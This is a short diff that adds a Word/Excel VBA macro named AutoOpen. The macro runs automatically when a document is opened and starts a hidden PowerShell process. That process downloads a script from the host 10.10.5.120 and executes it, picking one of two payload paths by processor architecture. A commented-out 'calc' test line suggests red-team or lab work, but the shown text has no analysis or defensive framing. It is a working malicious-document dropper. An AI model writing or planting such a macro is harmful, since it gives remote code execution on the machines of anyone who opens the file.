@@ -1,0 +1,12 @@
+Sub AutoOpen()
+
+    Dim Shell As Object
+    Set Shell = CreateObject("wscript.shell")
+    'Shell.Run "calc"
+    If Shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") = "AMD64" Then
+        Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120/pixel'))"""
+    Else
+        Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120/b'))"""
+    End If
+
+End Sub
